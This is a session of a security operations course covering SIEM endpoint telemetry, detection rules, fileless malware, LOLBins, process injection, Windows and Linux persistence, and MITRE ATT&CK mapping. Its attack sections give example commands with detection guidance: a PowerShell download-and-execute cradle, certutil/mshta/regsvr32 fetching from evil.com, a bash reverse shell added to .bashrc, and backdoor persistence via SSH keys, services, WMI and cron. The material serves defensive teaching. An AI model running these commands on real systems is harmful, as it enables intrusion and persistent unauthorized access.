## 8. Endpoint Telemetry in a SIEM

Collecting endpoint data into a SIEM requires careful planning to balance visibility, storage costs, and alert quality.

### 8.1 What to Collect

**Tier 1 (Always collect — critical for detection):**

* Windows Security log (auth events, process creation 4688)
* Sysmon events (if deployed)
* Linux auth.log / /var/log/secure
* EDR alerts and telemetry
* Antivirus detections and quarantine events

**Tier 2 (Collect on important systems — servers, DCs):**

* Windows System log (service installation 7045)
* PowerShell Script Block Logging (4104)
* auditd events (Linux)
* DNS query logs

**Tier 3 (Collect selectively or on-demand):**

* Full process execution with arguments
* Full file I/O monitoring
* Registry monitoring for all keys
* Complete network flow per process

### 8.2 Log Normalization

Different endpoint sources use different log formats.
A SIEM must normalize these into a common data model:

```text
Windows 4688 (process creation):
  NewProcessName → process.executable
  CommandLine    → process.command_line
  SubjectUserName → user.name
  ParentProcessName → process.parent.executable

Sysmon Event 1 (process creation):
  Image          → process.executable
  CommandLine    → process.command_line
  User           → user.name
  ParentImage    → process.parent.executable

Linux auditd execve:
  exe            → process.executable
  a0+a1+...      → process.command_line (reconstructed)
  auid            → user.name
  ppid            → process.parent.pid
```

Elastic Common Schema (ECS), OCSF (Open Cybersecurity Schema Framework), and CIM (Splunk's Common Information Model) are widely used normalization frameworks.

### 8.3 Detection Engineering for Endpoints

Effective SIEM rules for endpoint events follow a **signal-to-noise** optimization:

**High-fidelity, low-noise rules (always on):**

```text
RULE: EDR alert from any source → ALERT (HIGH)
RULE: AV detection with quarantine failure → ALERT (HIGH)
RULE: Process created from temp directory with network connection → ALERT (MEDIUM)
RULE: LSASS memory access by non-system process → ALERT (HIGH)
```

**Threshold-based rules:**

```text
RULE: 10+ failed logons (4625) same source, 5 minutes → ALERT (MEDIUM)
RULE: 3+ different users failed same source, 10 minutes → ALERT (HIGH) [password spray]
RULE: Successful logon (4624) after 10+ failures → ALERT (HIGH)
```

**Anomaly-based rules:**

```text
RULE: Process executes from path not seen in past 30 days for this host → ALERT (LOW)
RULE: User logs in at unusual hour compared to 90-day baseline → ALERT (LOW)
RULE: Volume of 4688 events for host exceeds 2 std dev above mean → INVESTIGATE
```

---

## 9. Common Endpoint Attacks

### 9.1 Fileless Malware

Fileless malware executes entirely in memory without writing malicious files to disk.
This evades file-based AV scanning.

**Common techniques:**

**PowerShell in-memory execution:**

```powershell
# Download and execute without touching disk
IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.com/stage2.ps1')

# Or using Invoke-Expression
$code = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('...'))
Invoke-Expression $code
```

**Reflective DLL injection:**
A DLL is loaded from memory rather than from disk, evading both file-based detection and standard DLL monitoring.

**Process hollowing:**

1. Legitimate process (e.g., `svchost.exe`) is started in a suspended state
1. Its memory is unmapped
1. Malicious code is written into the process's memory space
1. Process resumes — now running malicious code under the guise of a legitimate process

**Detection challenges:**

* No file hash to match
* Behavior appears to come from a legitimate process
* Memory forensics required for full analysis

**Detection methods:**

* Script Block Logging captures PowerShell content after deobfuscation
* Sysmon Event 8 (CreateRemoteThread) detects injection
* Sysmon Event 10 (ProcessAccess) detects suspicious memory reads
* EDR behavioral rules detect process hollowing patterns

### 9.2 Living Off the Land Binaries (LOLBins)

LOLBins are legitimate Windows binaries that attackers abuse to execute malicious code.
Because these are trusted, signed Microsoft binaries, they often bypass AV and basic allow-listing.

**Common LOLBins and their abuse:**

| Binary | Path | Legitimate Use | Malicious Use |
|--------|------|----------------|---------------|
| `certutil.exe` | `C:\Windows\System32\` | Certificate management | Download files, decode Base64 payloads |
| `mshta.exe` | `C:\Windows\System32\` | Run .hta files | Execute remote JScript/VBScript |
| `regsvr32.exe` | `C:\Windows\System32\` | Register COM DLLs | Execute remote scripts ("Squiblydoo") |
| `wscript.exe` | `C:\Windows\System32\` | Run VBScript/JScript | Execute malicious scripts |
| `cscript.exe` | `C:\Windows\System32\` | Run VBScript/JScript | Execute malicious scripts |
| `msiexec.exe` | `C:\Windows\System32\` | Install MSI packages | Execute remote MSI payloads |
| `rundll32.exe` | `C:\Windows\System32\` | Load DLL functions | Execute malicious DLLs |
| `bitsadmin.exe` | `C:\Windows\System32\` | Background transfers | Download payloads |
| `powershell.exe` | `C:\Windows\System32\` | Administration | Everything malicious |
| `wmic.exe` | `C:\Windows\System32\wbem\` | WMI queries | Execute processes, lateral movement |
| `schtasks.exe` | `C:\Windows\System32\` | Manage scheduled tasks | Persistence |

**LOLBin detection examples:**

```text
# certutil downloading a file
certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\temp\p.exe

# mshta executing remote script
mshta.exe http://evil.com/payload.hta

# regsvr32 executing remote COM scriptlet (squiblydoo)
regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll
```

**Detection approach:** Alert on these binaries when they:

* Make outbound network connections
* Are spawned by unusual parent processes
* Have command lines with URLs or encoded content

### 9.3 Process Injection

Process injection techniques allow an attacker to execute code within another process's memory space, effectively hiding under a trusted process.

**Common injection techniques:**

**DLL Injection:**

```text
1. OpenProcess() → get handle to target process

2. VirtualAllocEx() → allocate memory in target process
3. WriteProcessMemory() → write DLL path into target memory
4. CreateRemoteThread() → execute LoadLibrary() in target → DLL loaded
```

**Detection:** Sysmon Event 8 (CreateRemoteThread), Sysmon Event 10 (ProcessAccess)

**Process Hollowing:**

```text
1. CreateProcess() with CREATE_SUSPENDED flag

2. NtUnmapViewOfSection() → hollow out process memory
3. VirtualAllocEx() → allocate space for malicious code
4. WriteProcessMemory() → write malicious code
5. SetThreadContext() → redirect execution
6. ResumeThread() → malicious code runs under legitimate process
```

**Detection:** Sysmon Event 25 (ProcessTampering), behavioral analysis of parent-child anomalies

**Reflective DLL Injection:**
The DLL is loaded directly from memory using a custom loader, avoiding the `LoadLibrary()` call and associated file operations.

**Detection:** Memory scanning by EDR, unusual memory-mapped regions without backing files

---

## 10. Persistence Mechanisms

After initial access, attackers establish persistence to survive reboots and maintain access.

### 10.1 Windows Persistence

#### Registry Run Keys

The most common Windows persistence technique.
Values added to Run keys cause execution at user login or system startup.

**Common Run key locations:**

```text
# Per-user (runs when the specific user logs on):
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce

# System-wide (runs for all users / at system start):
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce

# 32-bit on 64-bit system:
HKEY_LOCAL_MACHINE\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run
```

**Detection:** Sysmon Event 13 (RegistryEvent value set) for the above keys, Windows Event ID 4657

**Example malicious run key:**

```text
Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Value Name: "WindowsUpdateHelper"
Value Data: "C:\Users\jdoe\AppData\Roaming\Microsoft\wuhelper.exe"
```

Red flags: value data in `AppData\Roaming`, `Temp`, or other user-writable paths; value name mimicking legitimate processes.

#### Scheduled Tasks

Scheduled tasks can be created via `schtasks.exe`, Task Scheduler API, or WMI.

```cmd
# Create a scheduled task that runs at logon
schtasks /create /tn "MicrosoftEdgeUpdate" /tr "C:\tmp\backdoor.exe" /sc onlogon /ru SYSTEM
```

**Detection:**

* Windows Event ID 4698 (task created)
* Sysmon Event 1 showing `schtasks.exe` execution
* Check `C:\Windows\System32\Tasks\` directory for new XML files

#### Services

Malicious services run as SYSTEM and persist across reboots.

```cmd
sc create "WindowsFontService" binPath= "C:\Windows\Temp\svch0st.exe" start= auto
```

**Detection:**

* Windows Event ID 7045 (new service)
* Sysmon Event 1 showing `sc.exe` or PowerShell `New-Service`
* Check `HKLM\SYSTEM\CurrentControlSet\Services` for new entries

#### WMI Event Subscriptions

WMI event subscriptions are a stealthy persistence mechanism because they leave no files in standard startup locations.

```powershell
# Create a permanent WMI event subscription
$filterName = "BadFilter"
$consumerName = "BadConsumer"

# Event filter: trigger 5 minutes after OS start
$Filter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{
    Name = $filterName
    EventNameSpace = 'root\CimV2'
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 12"
}

# Consumer: what to run
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = $consumerName
    CommandLineTemplate = "cmd.exe /c C:\tmp\backdoor.exe"
}

# Bind filter to consumer
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}
```

**Detection:**

* Sysmon Events 19, 20, 21 (WMI activity)
* `Get-WMIObject -Namespace root\subscription -Class __EventFilter`

### 10.2 Linux Persistence

#### Cron Jobs

```console
# User crontab
crontab -e

* * * * * /tmp/.hidden/backdoor &>/dev/null

# System cron directories (root required)
/etc/cron.d/malicious-cron
/etc/cron.hourly/malicious-script
```

**Detection:**

* auditd watching `/var/spool/cron/` and `/etc/cron*`
* Wazuh FIM on cron files

#### SSH Authorized Keys

```console
# Adding a backdoor SSH key
echo "ssh-rsa AAAAB3NzaC1yc2E... backdoor" >> ~/.ssh/authorized_keys
# Or for root backdoor:
echo "ssh-rsa AAAAB3NzaC1yc2E... backdoor" >> /root/.ssh/authorized_keys
```

**Detection:**

* auditd watching `~/.ssh/authorized_keys`
* Wazuh FIM

#### Systemd Services

```bash
# Create a malicious systemd service
cat > /etc/systemd/system/linux-update.service << EOF
[Unit]
Description=Linux Update Service
After=network.target

[Service]
ExecStart=/tmp/.x/payload
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable linux-update
```

**Detection:**

* auditd watching `/etc/systemd/system/`
* Wazuh FIM
* Monitor `systemctl enable` commands

#### .bashrc / .profile / .bash_profile Modification

```console
echo "bash -i >& /dev/tcp/evil.com/4444 0>&1 &" >> ~/.bashrc
```

**Detection:**

* auditd watching shell init files
* Wazuh FIM on dotfiles

---

## 11. MITRE ATT&CK Endpoint Techniques

MITRE ATT&CK is a knowledge base of adversary tactics, techniques, and procedures (TTPs) based on real-world observations.
SOC teams use ATT&CK to:

* Understand the full range of threats
* Map detections to specific techniques
* Identify coverage gaps
* Communicate about threats in a common language

### Key Endpoint Techniques

#### T1059 — Command and Scripting Interpreter

Attackers use command interpreters to execute malicious commands.

**Sub-techniques:**

* **T1059.001 — PowerShell:** Most common Windows attack vector
* **T1059.003 — Windows Command Shell:** cmd.exe abuse
* **T1059.004 — Unix Shell:** bash/sh execution
* **T1059.005 — Visual Basic:** VBScript, macros
* **T1059.006 — Python:** Python-based payloads
* **T1059.007 — JavaScript:** JScript, Node.js payloads

**Detection:**

* Enable PowerShell Script Block Logging
* Monitor for encoded commands (`-EncodedCommand`, `-enc`)
* Baseline which users/systems should run scripts
* Alert on `cmd.exe` spawned by Office applications

#### T1053 — Scheduled Task/Job

**Sub-techniques:**

* **T1053.002 — At:** Legacy `at.exe` scheduling
* **T1053.005 — Scheduled Task:** Windows Task Scheduler
* **T1053.006 — Systemd Timers:** Linux systemd timer units
* **T1053.003 — Cron:** Unix cron

**Detection:**

* Windows Event 4698 (task created)
* Alert on tasks created by non-standard processes
* Monitor task execution from `%TEMP%` or `%APPDATA%` paths

#### T1547 — Boot or Logon Autostart Execution

**Sub-techniques (Windows):**

* **T1547.001 — Registry Run Keys / Startup Folder:** Most common
* **T1547.009 — Shortcut Modification:** LNK file abuse
* **T1547.012 — Print Processors:** DLL-based persistence

**Sub-techniques (Linux):**

* **T1547.006 — Kernel Modules and Extensions:** Rootkit-level persistence
* **T1547.013 — XDG Autostart Entries:** Linux desktop autostart

**Detection:**

* Sysmon Events 12, 13, 14 for Registry Run keys
* Monitor Startup folder (`shell:startup`)

#### T1055 — Process Injection

Attackers inject code into running processes to evade detection and elevate privileges.

**Sub-techniques:**

* **T1055.001 — Dynamic-link Library Injection**
* **T1055.002 — Portable Executable Injection**
* **T1055.003 — Thread Execution Hijacking**
* **T1055.012 — Process Hollowing**

**Detection:**

* Sysmon Event 8 (CreateRemoteThread)
* Sysmon Event 10 (ProcessAccess to LSASS)
* Sysmon Event 25 (ProcessTampering)
* EDR memory analysis

#### T1036 — Masquerading

Attackers name processes, files, or services to look like legitimate ones.

**Sub-techniques:**

* **T1036.003 — Rename System Utilities:** Copy `cmd.exe` as `svchost.exe`
* **T1036.004 — Masquerade Task or Service:** Name malicious service like "WindowsUpdate"
* **T1036.005 — Match Legitimate Name or Location:** Malware in `C:\Windows\` imitating system files

**Detection:**

* Hash known-good system utilities and alert on mismatches
* Check process executable path vs. expected path
* Parent-child relationship anomalies (svchost.exe with unusual parent)

### ATT&CK in Practice: Detection Coverage Matrix

For each relevant ATT&CK technique, a SOC should document:

| Technique | Detection Method | Data Source | Alert Level | Tuning Notes |
|-----------|----------------|-------------|-------------|-------------|
| T1059.001 (PowerShell) | Script Block Log + cmdline | Sysmon E1, Event 4104 | Medium | Exclude admin scripts |
| T1053.005 (Sched Task) | Event 4698 | Windows Security | High | Exclude IT deployment |
| T1055.012 (Hollowing) | Event 25 | Sysmon | Critical | Rare false positives |
| T1547.001 (Run Keys) | Registry events | Sysmon E13 | High | Exclude known software |
| T1036.005 (Masquerade) | Hash + path check | EDR | High | Baseline required |

---

## 12. References

### Official Documentation

* Microsoft Sysinternals Sysmon: https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
* Microsoft Security Auditing Recommendations: https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/audit-policy-recommendations
* Linux Audit Documentation: https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/9/html/security_hardening/auditing-the-system_security-hardening
* Wazuh Documentation: https://documentation.wazuh.com/

### MITRE ATT&CK

* MITRE ATT&CK Framework: https://attack.mitre.org/
* ATT&CK Navigator: https://mitre-attack.github.io/attack-navigator/

### Sysmon Configurations

* SwiftOnSecurity Sysmon Config: https://github.com/SwiftOnSecurity/sysmon-config
* Olaf Hartong Sysmon Modular: https://github.com/olafhartong/sysmon-modular

### LOLBins Reference

* LOLBAS Project: https://lolbas-project.github.io/
* GTFOBins (Linux): https://gtfobins.github.io/

### Security Frameworks and Tools

* CrowdStrike Falcon Documentation: https://falcon.crowdstrike.com/documentation/
* OSSEC Documentation: https://www.ossec.net/docs/
* osquery Documentation: https://osquery.readthedocs.io/

### Research and Further Reading

* "The Art of Memory Forensics" — Ligh, Case, Levy, Walters (Wiley)
* "Windows Internals" — Russinovich, Solomon, Ionescu (Microsoft Press)
* NSA Cybersecurity Event Log Recommendations: https://media.defense.gov/2022/Jun/13/2003018511/-1/-1/0/CSI_LOGGING_RECOMMENDATIONS.PDF
* CISA Known Exploited Vulnerabilities Catalog: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

### Academic and Industry Reports

* Mandiant M-Trends Report (annual): https://www.mandiant.com/resources/m-trends
* Verizon Data Breach Investigations Report (DBIR): https://www.verizon.com/business/resources/reports/dbir/

---

*Session 05 of the Security Operations Master Class | Digital4Security*
